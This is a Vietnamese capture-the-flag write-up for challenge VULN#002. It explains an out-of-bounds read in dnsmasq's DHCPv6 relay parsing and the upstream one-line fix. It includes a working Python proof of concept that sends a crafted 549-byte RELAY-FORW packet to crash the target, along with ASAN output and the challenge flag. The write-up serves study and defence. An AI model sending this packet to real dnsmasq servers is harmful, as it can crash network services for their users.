---
title: "VULN#002"
category: "Vuln Research"
tags: ["dnsmasq", "dhcpv6", "relay-forward", "out-of-bounds-read", "asan", "crash-oracle"]
solve_date: "2026-10-26T09:54:25+07:00"
language: "vi"
points: 112
---

# VULN#002 — DHCPv6 relay của dnsmasq: relay message rỗng gây OOB read

**Flag:** CTF{67f6cb9066aec0b416ebcd43b6eed73c}  
**Service:** 169.58.126.107:7026  
**Định dạng flag:** CTF{}

## Đề bài

> VULN#002 — DHCPv6 relay của Acme Gateway được xây dựng từ một DHCP/DNS forwarder mã nguồn mở có thật, không sửa đổi, tại revision thực tế.

Handout là đúng source tree dnsmasq dùng để build target. Service nhận length big-endian 4 byte rồi raw packet, đưa vào DHCPv6 path của dnsmasq và báo process có crash hay không. Crash khớp bug mục tiêu sẽ trả flag.

## Phân tích

### Xác định revision

Archive khớp chính xác upstream dnsmasq commit c8168e8. Commit này là parent trực tiếp của 0597828 — “Tighten length checking to avoid possible buffer read-overrun in DHCPv6”. Bug thuộc dạng fix một dòng quen thuộc; handout cố ý dùng parent còn lỗi.

### Bug

Trong src/rfc3315.c, dhcp6_maybe_relay() bắt đầu như sau:

```c
static int dhcp6_maybe_relay(struct state *state,
                             void *inbuff, size_t sz,
                             struct in6_addr *client_addr,
                             int is_unicast, time_t now)
{
  void *p = inbuff;
  ...
  unsigned int msg_type = *((unsigned char *)p);
```

Function dereference byte đầu trước khi kiểm tra packet dài ít nhất 4 byte — DHCPv6 message header có 4 byte (type + transaction ID 3 byte). RELAY-FORW (type 12) chứa OPTION6_RELAY_MSG (code 9) có length 0 sẽ đi tới recursive call ở line 255 với sz = 0:

```c
if (dhcp6_maybe_relay(state, p + 4, opt_len, client_addr, 0, now))
```

Lần gọi đệ quy tiếp theo đọc *inbuff từ buffer dài 0 — OOB read một byte ngay sau receive allocation. Upstream fix thêm:

```c
if (sz < 4)
  return 0;
```

trước phép dereference.

### Vì sao kích thước packet quan trọng

recv_dhcp_packet() dùng buffer ban đầu 548 byte và realloc đúng bằng kích thước datagram nếu datagram lớn hơn. Packet chính xác **549 byte** khiến receive allocation cũng dài 549 byte; phép đọc một byte từ relay message rỗng nằm đúng sau allocation và allocator/ASAN bắt được.

| Field | Bytes | Giá trị |
|---|---:|---|
| Message type / hop count | 2 | 12 00 (RELAY-FORW, hop 0) |
| Link address | 16 | fd00::1 |
| Peer address | 16 | fd00::1 |
| Filler option | 511 | option code 50, length 507, 507 filler bytes |
| Relay message option | 4 | option code 9, length 0 |
| **Tổng** | **549** | |

## PoC

```python
import socket

HOST, PORT = "169.58.126.107", 7026
link = socket.inet_pton(socket.AF_INET6, "fd00::1")
peer = socket.inet_pton(socket.AF_INET6, "fd00::1")

pkt  = bytes([12, 0]) + link + peer
pkt += (50).to_bytes(2, "big") + (507).to_bytes(2, "big") + b"A" * 507
pkt += (9).to_bytes(2, "big") + (0).to_bytes(2, "big")
assert len(pkt) == 549

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(len(pkt).to_bytes(4, "big") + pkt)
print(s.recv(4096).decode(errors="replace"))
```

Xác minh local với bản build ASAN của source:

```text
==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 1
    #0 dhcp6_maybe_relay src/rfc3315.c:115
    #1 dhcp6_maybe_relay src/rfc3315.c:255
    #2 dhcp6_reply src/rfc3315.c:...
```

Harness remote xác nhận signature mục tiêu:

```text
status: confirmed
FLAG: CTF{67f6cb9066aec0b416ebcd43b6eed73c}
```

## Ghi chú

- Packet không cần DHCPv6 context hợp lệ: không cần link-address prefix match, client ID hay relay message content. Bug nằm ở kiểm tra frame length trước mọi xử lý ngữ nghĩa.
- RELAY-FORW với option không rỗng nhưng thiếu relay message cũng có thể tạo reply không có context; relay message length 0 mới kích hoạt OOB read.
- Target là crash oracle. Các probe trước trả status: no crash (timeout cố định 3,5 giây) vì packet hợp lệ về cấu trúc nhưng chưa tới dereference lỗi; packet biên 549 byte trả trong khoảng 1,1 giây do process chết sớm.
- Cùng fix xử lý các message ngắn khác, nhưng OPTION6_RELAY_MSG rỗng là trigger tối thiểu, không cần context.

## Tham khảo

- dnsmasq upstream commit 0597828 — “Tighten length checking to avoid possible buffer read-overrun in DHCPv6”
- dnsmasq git: https://thekelleys.org.uk/git/dnsmasq.git
- CERT VU#471747 — dnsmasq vulnerabilities: https://kb.cert.org/vuls/id/471747
